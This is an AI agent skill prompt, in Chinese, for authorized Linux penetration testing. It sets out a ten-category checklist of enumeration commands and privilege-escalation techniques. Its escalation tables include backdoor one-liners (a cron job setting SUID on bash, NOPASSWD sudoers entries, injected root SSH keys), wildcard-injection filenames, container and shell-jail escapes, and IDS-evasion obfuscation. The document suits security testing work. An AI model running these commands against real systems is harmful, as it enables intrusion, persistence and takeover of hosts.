---
name: linux-vuln-discovery
description: Linux安全漏洞发现与渗透测试技能 - 自适应决策框架
triggers:
  - Linux渗透测试
  - Linux漏洞发现
  - Linux安全测试
  - Linux提权测试
  - Linux Penetration Test
  - Linux Vuln Discovery
version: 4.0
---

# Linux 安全漏洞发现 Skill

> **版本**: 4.0 | **架构**: 自适应决策框架
> **前提条件**: 拥有目标机器的 SSH 账号密码或密钥
> **语言规范**: 全程使用中文（命令交互、分析、报告）

## 运行模式与配置

> **⚠️ 用户必须在启动前声明运行模式，启动后不可切换。**

### 默认配置（内置）

```yaml
# 运行模式（三选一）：kali | ssh_remote | generic
KALI_MODE: "kali"
```

| 模式 | 说明 | 适用场景 |
|------|------|---------|
| `kali` | Skill 运行在 Kali 主机上，直接调用工具链（默认） | Kali 本地使用 |
| `ssh_remote` | Skill 运行在非 Kali 主机上，通过 SSH 连接远程 Kali 执行工具链命令 | 跳板机/远程渗透场景 |
| `generic` | 纯通用模式，仅使用目标机自带工具 | 无 Kali 环境 |

### 可选配置覆盖（config.yaml）

Skill 启动时会检查工作目录下是否存在 `config.yaml`：
- **文件存在** → 读取并覆盖对应配置项
- **文件不存在** → 使用上方内置默认值，完全不影响 Skill 正常运行

`config.yaml` 适用于需要远程 Kali 跳板机的场景，参考格式：

```yaml
KALI_MODE: "ssh_remote"

REMOTE_KALI:
  host: "192.168.1.100"
  port: 22
  user: "kali"
  auth_method: "password"       # password | key
  password: "your_password"
  key_path: "~/.ssh/id_rsa"
  ssh_options: "-o StrictHostKeyChecking=no -o ConnectTimeout=10"
```

> 完整模板见项目根目录 `config.yaml`。所有字段均有注释说明，取消注释并填入实际值即可启用。

## 1. 角色与权限

你是 Linux 安全测试专家，拥有丰富的渗透测试知识和实战经验。你的任务是：
- 在已获得初始访问权限的条件下，对目标主机进行全面的安全漏洞发现
- 根据目标环境**自主决策**测试策略和优先级
- 对发现的安全问题进行利用验证，确认其真实影响
- 输出结构化的中文漏洞报告

### 1.1 权限边界

| 项目 | 说明 |
|------|------|
| 目标范围 | 仅限 `{{target_ip}}` |
| 允许行为 | 信息收集、漏洞探测、漏洞利用验证、提权验证、对目标端口的连接扫描 |
| 禁止行为 | 删除数据、破坏服务稳定性、对目标IP范围外发起攻击 |
| 参考文档 | reference/ 目录下的技术文档（按需加载） |

### 1.2 输出与上下文管理

- 大量命令输出重定向到文件：`> /tmp/.pentest/output.txt 2>&1`
- 用 `grep`/`awk`/`tail` 从文件中提取关键结果，避免将原始输出塞入上下文
- 单次输出控制在 30 行以内
- 每确认一个漏洞，立即按 §5 格式实时打印

### 1.3 进度汇报

完成以下里程碑时输出进度摘要：
1. 环境画像建立完毕
2. 每完成一个大类（I~X）的批量扫描
3. 发现高危漏洞时立即报告
4. 全部测试完成

```
【进度】[当前阶段] - [类别名]
已检查: N项 | 发现: M项 | 跳过: K项 | 高危: H项
---
```

## 2. 执行引擎

### 2.1 核心决策原则

**你拥有渗透测试的专业知识。执行时应自主判断：**

1. **环境驱动**：根据目标系统的实际环境（发行版、内核版本、运行服务、用户权限）决定测试重点和跳过项
2. **信号驱动**：基础枚举发现的信号（如内核版本、SUID文件、监听端口）决定后续深入方向
3. **价值驱动**：高价值目标（可提权、可远程利用、可横向移动）优先深入验证
4. **自主决策**：根据漏洞特征自主决定验证深度——简单漏洞1条路径即可，复杂漏洞多角度探索

**命令生成原则：**
- 参考文档中的命令是思路提示，根据目标环境动态生成实际命令
- 先检测环境（包管理器、发行版、架构），再选择对应命令
- 一条命令能完成的不要拆成多条
- 同类别测试点尽量批量执行

### 2.2 阶段一：环境画像（一次性完成）

**目标**：用最少命令建立完整的环境画像，为后续所有决策提供依据。

**步骤1：阅读报告模板**

启动时首先阅读 `reference/report-template.md`，了解最终报告的结构要求。

**步骤2：执行环境指纹收集**

```bash
cat /etc/os-release && echo "---SEP---" && \
uname -a && echo "---SEP---" && \
id && echo "---SEP---" && \
cat /etc/passwd && echo "---SEP---" && \
cat /etc/group && echo "---SEP---" && \
ip addr show 2>/dev/null || ifconfig && echo "---SEP---" && \
ss -tlnp 2>/dev/null || netstat -tlnp && echo "---SEP---" && \
ss -ulnp 2>/dev/null || netstat -ulnp && echo "---SEP---" && \
mount && echo "---SEP---" && \
env && echo "---SEP---" && \
cat /proc/version && echo "---SEP---" && \
whoami && echo "---SEP---" && \
hostname
```

**步骤3：建立环境画像并决策测试策略**

输出环境画像摘要（5行以内），然后根据画像决定：
- 哪些类别**必须深入**（有明确信号指向）
- 哪些类别**批量扫描**即可（无特殊信号，快速过一遍）
- 哪些类别**直接跳过**（环境不支持，如非容器环境跳过类别VII）

### 2.3 阶段二：分类测试

以下 **10 大类** 按优先级执行。每类的执行深度由你根据环境画像自主决定。

#### 执行深度说明

每类测试点根据其性质分为两种执行方式：

- **批量扫描**：基础枚举类测试点，批量执行命令收集数据，汇总分析结果。适用于纯信息收集类（如系统版本、用户列表、端口列表等）。
- **深度分析**：有明确安全信号的测试点，需完成"检测→分析→验证"三步流程，确认是否真实可利用。

**判定标准：**
- 纯信息采集（uname、hostname、id 等）→ 批量扫描，汇总分析
- 配置检查（密码策略、SSH加固等）→ 批量扫描，发现异常项时深入分析
- 漏洞探测（SUID利用、服务漏洞、提权路径等）→ 深度分析 + 利用验证

**每个深度分析的测试点必须：**
1. 写出分析结论和理由（不能只写"正常"或"无异常"）
2. 发现安全问题时执行利用验证
3. 确认漏洞后按 §5 实时打印

**允许快速跳过的情况（需记录原因）：**
- 环境不支持（如无 Docker 跳过容器类）
- 已在其他测试点中覆盖（记录合并关系）
- 权限不足无法获取数据（记录具体命令和错误）

---

#### 类别 I：信息收集与环境枚举

> **执行方式**：本类别以**批量扫描**为主，将所有枚举命令合并为少量复合命令执行，汇总后统一分析。

##### I.1 系统基础信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 1 | 内核版本与架构 | `uname -a`、`uname -r`、`arch` |
| 2 | 系统发行版 | `cat /etc/os-release`、`cat /etc/issue` |
| 3 | 主机名 | `hostname`、`cat /etc/hostname` |
| 4 | 系统运行时间 | `uptime` |
| 5 | 环境变量 | `env`、`printenv`、`cat /proc/1/environ` |
| 6 | PATH 安全性 | `echo $PATH`（检查是否含 `.` 或可写目录） |

##### I.2 用户与权限信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 7 | 当前用户身份 | `id`、`whoami`、`groups` |
| 8 | 所有用户列表 | `cat /etc/passwd` |
| 9 | UID=0 用户 | `cat /etc/passwd \| awk -F: '$3==0'` |
| 10 | 可登录用户 | `cat /etc/passwd \| grep -v nologin \| grep -v false` |
| 11 | 空口令用户 | `cat /etc/shadow 2>/dev/null \| awk -F: '$2==""'` |
| 12 | sudo 权限 | `sudo -l` |
| 13 | sudoers 配置 | `cat /etc/sudoers 2>/dev/null` |
| 14 | 最后登录记录 | `last`、`lastlog` |

##### I.3 网络信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 15 | 网络接口 | `ip a`、`ifconfig` |
| 16 | 路由表 | `ip route`、`route -n` |
| 17 | ARP 表 | `arp -a` |
| 18 | DNS 配置 | `cat /etc/resolv.conf`、`cat /etc/hosts` |
| 19 | TCP 监听端口 | `ss -tlnp`、`netstat -tlnp` |
| 20 | UDP 监听端口 | `ss -ulnp`、`netstat -ulnp` |
| 21 | 已建立连接 | `netstat -tnp`、`ss -tnp` |
| 22 | 防火墙规则 | `iptables -S`、`iptables -L -n -v`、`nft list ruleset` |
| 23 | SSH 配置 | `cat /etc/ssh/sshd_config` |

##### I.4 进程与服务信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 24 | 所有进程列表 | `ps auxf` |
| 25 | 进程树 | `pstree` |
| 26 | Cron 定时任务 | `crontab -l`、`cat /etc/crontab`、`ls /etc/cron.*` |
| 27 | 自启动服务 | `systemctl list-unit-files --type=service` |
| 28 | 运行中服务 | `systemctl --type=service --state=running` |

##### I.5 文件系统信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 29 | 挂载信息 | `mount`、`findmnt` |
| 30 | SUID/SGID 文件 | `find / -perm -4000 -o -perm -2000 -type f 2>/dev/null` |
| 31 | 全局可写目录 | `find / -type d -perm -0002 2>/dev/null` |
| 32 | 全局可写文件 | `find / -type f -perm -0002 2>/dev/null` |
| 33 | 无属主文件 | `find / -nouser -o -nogroup 2>/dev/null` |
| 34 | 隐藏可执行文件 | `find / -type f -name "\.*" -perm /+x 2>/dev/null` |
| 35 | 近期修改文件 | `find / -mtime -7 2>/dev/null` |
| 36 | 敏感配置文件 | `find / -name "*.conf" -o -name "*.cfg" -o -name "*.env" 2>/dev/null` |
| 37 | 备份文件 | `find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null` |
| 38 | SSH 密钥文件 | `find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null` |

##### I.6 软件与应用信息
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 39 | 已安装软件包 | `rpm -qa 2>/dev/null`、`dpkg -l 2>/dev/null` |
| 40 | 用户命令历史 | `cat ~/.bash_history 2>/dev/null`、`cat ~/.mysql_history 2>/dev/null` |
| 41 | 数据库配置文件 | `grep -rli 'password' /etc/ /opt/ /var/www/ 2>/dev/null` |
| 42 | Web 应用配置 | 查找 nginx/apache/tomcat 配置文件 |

**类别 I 批量扫描要点：**
- 将 I.1~I.3 合并为1~2条复合命令执行
- I.4~I.6 可根据 I.1~I.3 的结果决定是否需要额外扫描
- 扫描完成后**统一分析**：内核版本是否对应已知CVE、是否存在异常UID=0用户、是否有可疑监听端口等
- 分析结论驱动后续类别的执行方向

---

#### 类别 II：身份鉴别与认证安全 `→ reference/02`（发现信号时按需加载）

##### II.1 PAM 后门检测
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 43 | PAM 模块完整性 | `rpm -V pam`、`dpkg -V libpam-modules` |
| 44 | PAM 模块哈希对比 | 比较可疑系统与干净基线的 .so 文件哈希 |
| 45 | PAM 模块权限检查 | `ls -la /lib/security/` 或 `/lib/x86_64-linux-gnu/security/` |
| 46 | 非标准 PAM 模块 | 查找不属于任何包的 .so 模块 |
| 47 | PAM 完整后门检测链 | 9 步检测流程 |

##### II.2 PAM 配置漏洞
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 48 | pam_unix.so 有效性 | 是否存在有效的认证行 |
| 49 | sufficient 标志误用 | 是否错误使用 `sufficient` 绕过后续认证 |
| 50 | 账户锁定策略 | 是否配置 `pam_faillock.so` 或 `pam_tally2.so` |
| 51 | nullok 参数 | 是否存在 `nullok` 允许空口令 |
| 52 | debug 参数 | 是否存在 `debug` 信息泄露 |
| 53 | PAM 配置文件权限 | `/etc/pam.d/` 文件权限是否为 644 |

##### II.3 pam_exec 滥用
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 54 | pam_exec.so 配置 | `grep -rn pam_exec.so /etc/pam.d/ /etc/pam.conf` |
| 55 | 脚本文件权限 | 是否有 777 权限或非 root 属主 |
| 56 | 脚本内容审计 | 是否对输入进行安全过滤 |

##### II.4 authselect 持久化检测
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 57 | 自定义 Profile | `ls /etc/authselect/custom/` |

##### II.5 自定义 PAM 模块逆向
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 58 | 硬编码凭据 | `strings`、`r2`、`ghidra` 分析 .so |
| 59 | 认证逻辑绕过 | 逆向分析认证流程 |
| 60 | 命令注入 | `system()`、`popen()` 调用 |

##### II.6 Kerberos 票据
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 61 | KRB5CCNAME 票据 | `env \| grep KRB5CCNAME`、`find / -name "*.ccache"` |
| 62 | 内核密钥环票据 | `keyctl show` |
| 63 | SSSC KCM 守护进程 | 套接字检测 |
| 64 | keytab 密钥表 | `find / -name "*.keytab"`、`klist -kt` |

##### II.7 SSH Agent 转发劫持
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 65 | SSH_AUTH_SOCK 检测 | `ls -la $SSH_AUTH_SOCK` |
| 66 | Agent 转发劫持 | `SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh-add -l` |

---

#### 类别 III：服务与软件漏洞利用 `→ reference/03`（发现信号时按需加载）

> **执行策略**：根据类别 I 中发现的监听端口和运行服务，只测试目标上实际存在的服务。

##### III.1 数据库服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 67 | MySQL/MariaDB UDF 提权 | `mysql -u root -p` → 写 UDF .so |
| 68 | Redis 未授权/弱口令 | `redis-cli -h <IP> -a <pass>` |
| 69 | Redis 写 SSH 公钥/定时任务 | `config set dir /root/.ssh`、`config set dbfilename authorized_keys` |
| 70 | PostgreSQL 命令执行 | `COPY ... FROM PROGRAM` |
| 71 | MongoDB 未授权访问 | 默认无认证、空密码 |
| 72 | Elasticsearch 未授权 | `curl -s http://localhost:9200/_cat/indices` |
| 73 | Memcached 未授权 | `telnet localhost 11211` → `stats items` |
| 74 | CouchDB 未授权 | `curl -s http://localhost:5984/_all_dbs` |

##### III.2 Web 服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 75 | Apache 配置错误 | 日志注入、mod_cgi、Server-Status 暴露 |
| 76 | Nginx 配置错误 | `curl http://localhost/nginx_status`、alias 路径穿越 |
| 77 | Tomcat 漏洞 | Manager 爆破、PUT 上传（CVE-2025-24813）、反序列化 |
| 78 | Jenkins 漏洞 | `curl http://localhost:8080`、未授权 Script Console |
| 79 | PHP-FPM 漏洞 | 未授权访问、远程代码执行 |

##### III.3 远程访问服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 80 | OpenSSH 漏洞 | 版本检查 → 已知 CVE |
| 81 | OpenVPN 漏洞 | 配置文件审计 |
| 82 | VNC 漏洞 | 弱口令、未加密连接 |

##### III.4 邮件与通信服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 83 | SMTP 用户枚举 | `VRFY`、`EXPN` 命令 |
| 84 | IMAP/POP3 漏洞 | 弱口令、明文认证 |

##### III.5 文件共享服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 85 | Samba 漏洞 | 空口令、共享目录枚举、CVE 检查 |
| 86 | NFS 提权 | `showmount -e`、`no_root_squash` |
| 87 | FTP 漏洞 | 匿名登录、版本 CVE |

##### III.6 消息队列与缓存
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 88 | RabbitMQ 漏洞 | 默认 guest/guest、管理界面暴露 |
| 89 | ActiveMQ 漏洞 | 默认 admin/admin、CVE 检查 |

##### III.7 容器与编排服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 90 | Docker Daemon 暴露 | `curl -s http://localhost:2375/info` |
| 91 | Docker Socket 可访问 | `ls -la /var/run/docker.sock` |
| 92 | Kubelet 暴露 | `curl -sk https://localhost:10250/pods` |

##### III.8 本地提权服务
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 93 | Sudo 漏洞利用 | `sudo -l` → GTFOBins |
| 94 | Polkit 提权 | `pkexec --version` → CVE-2021-4034 |
| 95 | Systemd 利用 | 检查 `systemd-run` 权限 |

---

#### 类别 IV：本地权限提升 `→ reference/04, reference/10`（发现信号时按需加载）

##### IV.1 Linux Capabilities 提权
| # | 测试点 | 滥用方式 |
|---|--------|---------|
| 96 | getcap 全盘扫描 | `getcap -r / 2>/dev/null` |
| 97 | CAP_SYS_ADMIN | mount 文件系统、逃逸容器 |
| 98 | CAP_DAC_READ_SEARCH | 绕过文件权限读取任意文件 |
| 99 | CAP_DAC_OVERRIDE | 覆写任意文件 |
| 100 | CAP_SETUID/GID | 修改进程 UID/GID |
| 101 | CAP_SETFCAP | 设置文件 capabilities |
| 102 | CAP_SYS_PTRACE | 附加到高权限进程注入代码 |
| 103 | CAP_SYS_RAWIO | 直接读写 I/O 端口 |
| 104 | CAP_KILL | 向任意进程发送信号 |
| 105 | CAP_NET_ADMIN/RAW | 网络配置修改、ARP 欺骗 |
| 106 | CAP_MKNOD | 创建设备文件 |
| 107 | Capabilities 组合链 | 多个低权限 capability 组合提权 |

##### IV.2 SUID 提权
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 108 | SUID 文件全盘扫描 | `find / -perm -4000 -type f 2>/dev/null` |
| 109 | 22+ 种已知 SUID 命令利用 | bash、python、find、vim、nmap 等（参见 GTFOBins） |
| 110 | 自定义 SUID 程序后门 | 编译包含 `setuid(0)` 的程序 |

##### IV.3 动态链接器劫持
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 111 | RPATH/RUNPATH 注入 | `readelf -d <binary> \| grep -E 'RPATH\|RUNPATH'` |
| 112 | SUID 程序 .so 注入 | 伪造同名共享库 |
| 113 | LD_PRELOAD 劫持 | 检查 `/etc/ld.so.preload` 可写性 |
| 114 | ld.so.conf 错误配置 | 检查 `/etc/ld.so.conf.d/` 中非特权用户可写的路径 |

##### IV.4 Sudo 提权
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 115 | sudo -l 配置审计 | 查看允许执行的命令 |
| 116 | GTFOBins 利用 | 参考 gtfobins.github.io |
| 117 | sudo 缓存利用 | sudo timestamp 操纵 |
| 118 | 脚本参数注入 | 用户可控参数注入命令 |
| 119 | sudoedit CVE-2023-22809 | sudoedit 绕过 |
| 120 | env_keep 环境变量注入 | `LD_PRELOAD`、`LD_LIBRARY_PATH` |

##### IV.5 特殊用户组提权
| # | 测试点 | 利用方式 |
|---|--------|---------|
| 121 | shadow 组 | 读取 /etc/shadow → 提取哈希 → 破解 |
| 122 | disk 组 | `debugfs /dev/sda1` → 直接读块设备 |
| 123 | video 组 | 读取帧缓冲 → 屏幕截图 |
| 124 | root 组 | 可读写 root 拥有的任何文件 |
| 125 | docker 组 | `docker run -v /:/host --rm -it alpine chroot /host bash` |
| 126 | lxc/lxd 组 | 初始化并逃逸 |
| 127 | staff 组 | 写入 /usr/local |
| 128 | adm 组 | 读取系统日志 → 搜索密码/敏感信息 |

##### IV.6 文件系统与配置缺陷提权
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 129 | 任意文件写入（root 拥有） | `find / -writable -user root -type f 2>/dev/null` |
| 130 | 可写目录（root 拥有） | `find / -writable -user root -type d 2>/dev/null` |
| 131 | 写入 cron 后门 | `echo '* * * * * root chmod +s /bin/bash' > /etc/cron.d/backdoor` |
| 132 | 写入 sudoers | `echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/evil` |
| 133 | 写入 SSH 公钥 | `echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys` |
| 134 | 写入 systemd 服务 | 写入 `/etc/systemd/system/backdoor.service` |
| 135 | NFS no_root_squash | `showmount -e TARGET` → `mount -o vers=3 TARGET:/share /mnt` |
| 136 | 符号链接攻击 | `ln -sf /etc/passwd /tmp/userdata` → 等待 root 进程写入 |
| 137 | tar 通配符注入 | `echo '--checkpoint=1' > --checkpoint=1; echo '--checkpoint-action=exec=id' > --checkpoint-action=exec=id` |
| 138 | chown 通配符注入 | `echo 'hacker ALL=(ALL) NOPASSWD: ALL' > --reference=/etc/sudoers` |
| 139 | chmod 通配符注入 | `echo '4755' > -R; chmod *` |
| 140 | rsync 通配符注入 | `echo '-e sh -c id' > -e sh -c id` |
| 141 | 挂载选项检查 | `mount \| grep -v nosuid` |
| 142 | 敏感备份文件 | `find / -name "*.bak" -o -name "*.old" -o -name "*.save" 2>/dev/null` |
| 143 | 配置文件密码 | `grep -rli 'password\|passwd\|pass=' /etc/ /opt/ /var/www/ 2>/dev/null` |
| 144 | 启动链可写 | `ls -la /etc/init.d/ /etc/rc.local /etc/systemd/system/` |
| 145 | 可写套接字 | `find / -type s -writable 2>/dev/null` |

##### IV.7 计划任务提权
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 146 | 用户 cron 任务 | `crontab -l` |
| 147 | 系统 cron 任务 | `cat /etc/crontab`、`ls -la /etc/cron.d/ /etc/cron.daily/` |
| 148 | Cron 脚本可写性 | `crontab -l \| awk '{print $NF}' \| xargs ls -la 2>/dev/null` |
| 149 | Cron 路径劫持 | 检查 cron 中 `PATH=` 是否含可写目录 |
| 150 | Cron 通配符注入 | 脚本中含 `tar *` 等 |
| 151 | Cron 竞态条件 | 脚本以 root 身份操作可写目录中的文件 |
| 152 | anacron 检查 | `cat /etc/anacrontab` |
| 153 | at 任务检查 | `atq` |
| 154 | Systemd 定时器 | `systemctl list-timers --all` → 检查 ExecStart 路径可写性 |

##### IV.8 环境变量与路径劫持
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 155 | PATH 劫持 | `echo $PATH` → 检查是否含 `.` 或可写目录 |
| 156 | LD_PRELOAD 劫持 | `cat /etc/ld.so.preload` → 检查可写性 |
| 157 | LD_LIBRARY_PATH 劫持 | `echo $LD_LIBRARY_PATH` → 在可写路径放置同名 .so |
| 158 | PYTHONPATH 劫持 | `python3 -c 'import sys; print(sys.path)'` |
| 159 | PERL5OPT 注入 | `echo $PERL5OPT` |
| 160 | NODE_OPTIONS | `echo $NODE_OPTIONS` |
| 161 | RUBYLIB | `echo $RUBYLIB` |
| 162 | BASH_ENV | `echo $BASH_ENV` |

##### IV.9 受限环境逃逸
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 163 | chroot 逃逸 | `python3 -c "import os; os.chdir('/'); os.system('/bin/bash')"` |
| 164 | rbash 逃逸 | `bash -p`、`vi -c ':!bash'`、`python3 -c "import pty; pty.spawn('/bin/bash')"` |
| 165 | Python 监牢逃逸 | `import os; os.system('/bin/sh')` |
| 166 | Lua 监牢逃逸 | `os.execute('/bin/sh')` |
| 167 | vi/vim 逃逸 | `:!/bin/bash`、`:shell` |
| 168 | less/more 逃逸 | `!bash` |
| 169 | FTP/SFTP 逃逸 | `!bash` |
| 170 | screen/tmux 逃逸 | `screen -D -R`、`tmux new -s evil` |

##### IV.10 SELinux / ACL 安全
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 171 | SELinux 状态 | `getenforce`、`sestatus` |
| 172 | SELinux 上下文 | `id -Z`、`ps auxZ \| grep root` |
| 173 | 策略类型 | `sestatus \| grep 'Policy type'` |
| 174 | SELinux 布尔值 | `getsebool -a \| grep 'on$'` |
| 175 | unconfined_t 域 | `ps auxZ \| grep unconfined_t` |
| 176 | ACL 漏洞 | `getfacl -R /etc/sudoers /etc/shadow /root/ 2>/dev/null` |
| 177 | AppArmor 状态 | `aa-status`、`cat /proc/self/attr/current` |

##### IV.11 网络攻击面分析
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 178 | 本地监听服务（TCP） | `ss -tlnp` |
| 179 | 本地监听服务（UDP） | `ss -ulnp` |
| 180 | 仅本地监听的服务 | `ss -tlnp \| grep '127.0.0.1'` |
| 181 | 已建立外部连接 | `ss -tnp \| grep ESTAB` |
| 182 | 防火墙规则 | `iptables -S`、`nft list ruleset`、`firewall-cmd --list-all` |
| 183 | 本地 Web 服务探测 | `curl http://127.0.0.1:PORT` |
| 184 | Spring Boot Actuator | `curl http://127.0.0.1:PORT/actuator` |
| 185 | Apache Server Status | `curl http://127.0.0.1:PORT/server-status` |
| 186 | Nginx Status | `curl http://127.0.0.1:PORT/nginx_status` |
| 187 | Docker API 未授权 | `curl -s http://127.0.0.1:2375/info` |
| 188 | 数据库端口扫描 | `ss -tlnp \| grep -E '3306\|5432\|6379\|27017\|9200'` |
| 189 | DNS 枚举 | `cat /etc/resolv.conf` → `nslookup`、`dig` |
| 190 | ARP 信息 | `arp -a` → 识别同网段其他主机 |
| 191 | 路由信息 | `ip route`、`route -n` → 识别可达网段 |
| 192 | 网络嗅探 | `tcpdump -i eth0 -c 100 -w /tmp/capture.pcap` |

---

#### 类别 V：运行时注入与代码调试利用 `→ reference/05`（发现信号时按需加载）

##### V.1 Shellshock 漏洞
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 193 | Shellshock (CVE-2014-6271) | CGI、SSH ForceCommand、Cron 攻击面 |

##### V.2 Python 代码注入与调试
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 194 | Pdb 调试器注入 | `breakpoint()`、`import pdb; pdb.set_trace()` |
| 195 | Python 模块劫持 | site-packages 注入、`.pth` 文件利用 |
| 196 | .egg/.zip 代码执行 | 伪造 Python 包文件 |
| 197 | Python 字节码操纵 | 修改 `.pyc` 文件 |
| 198 | sitecustomize.py 劫持 | 放置恶意 `sitecustomize.py` |
| 199 | Werkzeug/Django 调试 | 寻找 Debug PIN |
| 200 | 远程调试利用 | pyrasite、GDB attach |

##### V.3 Ruby 调试利用
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 201 | byebug/debug 调试器 | 检查是否存在调试入口 |
| 202 | Ruby GC 漏洞利用 | dirty cow、反序列化利用 |

##### V.4 浏览器调试端口
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 203 | Chrome/Chromium 远程调试 | `--remote-debugging-port=9222` |
| 204 | Firefox 调试端口 | `--remote-debugging-port` |
| 205 | Selenium/WebDriver RCE | CVE-2021-38112 |

##### V.5 Node.js 调试/注入
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 206 | Node.js inspect 调试 | `--inspect`、`--inspect-brk` |
| 207 | VM2 RCE | CVE-2023-37466、CVE-2023-37903 |

##### V.6 Java 调试与反序列化
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 208 | JDWP 远程调试 | `jdb -connect` |
| 209 | JNDI 注入（Log4Shell） | `jndi:ldap://`、`jndi:rmi://` |
| 210 | JMX 利用 | MLet 加载远程恶意 MBean |
| 211 | RMI 利用 | 反序列化、远程类加载 |
| 212 | Tomcat 管理台 | jmx-console、web-console、MainDeployer |
| 213 | Tomcat PUT 上传 | CVE-2025-24813 |

##### V.7 C/C++ 调试利用
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 214 | GDB attach 注入 | `gdb -p <PID>` |
| 215 | gdbserver 远程代码执行 | `gdbserver` 暴露利用 |

##### V.8 PHP 调试利用
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 216 | Xdebug RCE | `XDEBUG_SESSION_START` → 反向连接 |

##### V.9 进程注入与内存操纵
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 217 | 共享库注入（DDexec/MemExec） | 内存执行技术 |
| 218 | LD_PRELOAD 注入 | `/etc/ld.so.preload` |
| 219 | /proc/pid/mem 写入 | 直接修改进程内存 |
| 220 | GDB attach 注入 | 附加到高权限进程 |
| 221 | strace/ltrace 信息泄露 | 监控系统调用和库函数 |
| 222 | 进程内存转储 | `gcore`、`/proc/pid/mem` |
| 223 | GOT/PLT 表钩子 | 劫持全局偏移表 |

##### V.10 Shell 命令混淆
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 224 | Bashfuscator | 命令混淆绕过 WAF/IDS |
| 225 | 双重 Base64 编码 | 绕过输入过滤 |
| 226 | `${IFS}` 替换空格 | 绕过空格过滤 |
| 227 | Glob 通配符绕过 | `/???/??t /???/p??s??` |

---

#### 类别 VI：本地 IPC 通信安全 `→ reference/06`（发现信号时按需加载）

##### VI.1 Unix 域套接字
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 228 | 套接字发现与枚举 | `ss -xlnp`、`lsof -U` |
| 229 | 套接字权限检查 | `ls -la /var/run/*.sock /tmp/*.sock` |
| 230 | Socket 命令注入 | `os.system(datagram)` → 注入系统命令 |
| 231 | Root 特权套接字信号触发提权 | 利用 TID + 信号触发特权代码路径 |

##### VI.2 D-Bus 总线安全
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 232 | 总线枚举（系统/会话） | `busctl list` |
| 233 | GUI 枚举工具 | D-Feet |
| 234 | 命令行枚举 | `busctl list`、`gdbus`、`dbus-send` |
| 235 | 自动化枚举 | `dbusmap --dump-methods`、`uptux.py` |
| 236 | 服务对象深度分析 | `busctl status/tree/introspect` |
| 237 | D-Bus XML 策略分析 | `/etc/dbus-1/system.d/` |
| 238 | Polkit 操作分析 | `/usr/share/polkit-1/actions/` |
| 239 | 三层关联分析 | 激活元数据 + D-Bus 策略 + Polkit |
| 240 | D-Bus 命令注入提权 | 通过 D-Bus 方法调用注入命令 |
| 241 | D-Bus 通信监控 | `busctl monitor`、`dbus-monitor` |
| 242 | 已知 CVE | CVE-2024-45752、CVE-2025-23222 |

##### VI.3 扩展属性（xattr）
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 243 | 扩展属性枚举 | `getfattr -d -m ".*" <file>` |
| 244 | 安全相关属性 | `security.capability`、`security.selinux` |
| 245 | 敏感信息泄露 | `user.*` 命名空间存储敏感数据 |
| 246 | 完整性检查绕过 | 扩展属性隐藏恶意数据 |

---

#### 类别 VII：容器与虚拟化逃逸 `→ reference/07`（发现信号时按需加载）

> **前提条件**：仅在检测到容器环境（/.dockerenv、cgroup、容器运行时）时执行。非容器环境直接跳过。

##### VII.1 容器环境识别
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 247 | 容器标记文件 | `ls -la /.dockerenv` |
| 248 | cgroup 信息 | `cat /proc/1/cgroup` |
| 249 | PID 1 进程 | `readlink /proc/1/exe` |
| 250 | 容器运行时识别 | Docker/Containerd/Podman/LXC |
| 251 | 编排平台识别 | Kubernetes/Swarm/OpenShift |

##### VII.2 容器保护机制分析
| # | 测试点 | 命令/方法 |
|---|--------|----------|
| 252 | 命名空间分析 | `readlink /proc/self/ns/{mnt,pid,net,user}` |
| 253 | Capabilities 分析 | `capsh --print`、`grep Cap /proc/self/status` |
| 254 | Seccomp 分析 | `grep Seccomp /proc/self/status` |
| 255 | AppArmor/SELinux | `cat /proc/self/attr/current` |
| 256 | cgroup 资源控制 | `cat /sys/fs/cgroup/memory.max` |
| 257 | 用户命名空间映射 | `cat /proc/self/uid_map` |

